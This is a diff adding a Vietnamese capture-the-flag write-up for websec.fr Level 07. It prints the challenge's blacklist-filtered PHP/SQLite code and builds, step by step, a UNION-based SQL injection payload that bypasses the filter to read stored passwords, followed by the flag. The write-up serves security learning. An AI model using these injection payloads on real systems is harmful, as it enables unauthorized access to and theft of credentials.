@@ -353,3 +353,105 @@ Vậy với payload `${include%09$_POST[0]}$flag&submit=&0=flag.php`, chúng ta 
 ### Flag
 
 `WEBSEC{Writing_a_sp3llcheckEr_in_php_aint_no_fun}`
+
+## Level 07
+
+> Blacklist vs. SQLi
+>
+> 🔥 <https://websec.fr/level07/index.php>
+
+![image](images/level-07/image-1.png)
+
+Truy cập vào source code, chúng ta thấy đây là một thử thách liên quan tới khai thác lỗ hổng SQL Injection. Một điều đặc biệt là server thực hiện filter cực kỳ nhiều thông qua mảng `$blacklist`.
+
+Chúng ta được nhập vào tham số `user_id` từ body của POST request. Và giá trị của tham số này sẽ được sử dụng ở câu truy vấn `'SELECT id,login FROM users WHERE id=' . $injection;`:
+
+```php
+<?php
+ini_set('display_errors', 'on');
+ini_set('error_reporting', E_ALL);
+
+function sanitize($str) {
+    /* Rock-solid ! */
+    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "+", "-"];
+    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@"];
+    $special3 = ["[", "]", "^", "_", "`", "\\", "|", "{", "}"];
+
+    $sql = ["or", "is", "like", "glob", "join", "0", "limit", "char"];
+
+    $blacklist = array_merge($special1, $special2, $special3, $sql);
+
+    foreach ($blacklist as $value) {
+        if (stripos($str, $value) !== false)
+            die("Presence of '" . $value . "' detected: abort, abort, abort!\n");
+    }
+}
+
+if (isset($_POST['submit']) && isset($_POST['user_id'])) {
+    $injection = $_POST['user_id'];
+    $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
+
+    sanitize($injection);
+
+    //$query='SELECT id,login,password FROM users WHERE id=' . $injection;
+    $query = 'SELECT id,login FROM users WHERE id=' . $injection;
+    $getUsers = $pdo->query($query);
+    $users = $getUsers->fetchArray(SQLITE3_ASSOC);
+
+    $userDetails = false;
+    if ($users) {
+        $userDetails = $users;
+    }
+}
+
+```
+
+Nhập thử `1`, chúng ta thấy thông tin được trả về tại cột `login` chính là username tương ứng với `id` bằng `1`. Ở đây là `user_two`:
+
+![image](images/level-07/image-2.png)
+
+Chúng ta cùng kiểm tra thử với bảng `users` như sau:
+
+![image](images/level-07/image-3.png)
+
+Câu truy vấn `SELECT id,login FROM users WHERE id=1` lấy ra `id` và `login` với điều kiện `id=1`:
+
+![image](images/level-07/image-4.png)
+
+Với câu truy vấn dưới, chúng ta có thể đổi tên cột kết quả bằng từ khoá `AS`:
+
+```sql
+SELECT 1337 AS id, 1337 AS login, 1337 AS pw UNION SELECT * FROM users
+```
+
+![image](images/level-07/image-5.png)
+
+Chúng ta sẽ lấy ra 2 cột dữ liệu `id` và `pw`:
+
+```sql
+SELECT id, pw FROM (SELECT 1337 AS id, 1337 AS login, 1337 AS pw UNION SELECT * FROM users)
+```
+
+![image](images/level-07/image-6.png)
+
+Chúng ta kết hợp câu truy vấn bên trên với câu truy vấn gốc bằng cách sử dụng từ khoá `UNION` được:
+
+```sql
+SELECT id,login FROM users WHERE id=1337 UNION SELECT id, pw FROM (SELECT 1337 AS id, 1337 AS login, 1337 AS pw UNION SELECT * FROM users)
+```
+
+Có thể thấy rằng cột thứ hai đã có tên `login` nhưng lại chứa dữ liệu nằm ở cột `password` ban đầu. Vậy khi server lấy ra dữ liệu, chúng ta hoàn toàn xem được password:
+
+![image](images/level-07/image-7.png)
+
+Cuối cùng thực hiện trên thử thách, chúng ta cần thêm điều kiện `WHERE id IN(1)` bởi hàng đầu tiên trong kết quả có `id` mang giá trị `0` không chứa flag.
+
+```sql
+1337 UNION SELECT id, pw FROM (SELECT 1337 AS id, 1337 AS login, 1337 AS pw UNION SELECT * FROM users) WHERE id IN(1)
+```
+
+![image](images/level-07/image-8.png)
+
+### Flag
+
+`WEBSEC{Because_blacklist_based_filter_are_always_great}`
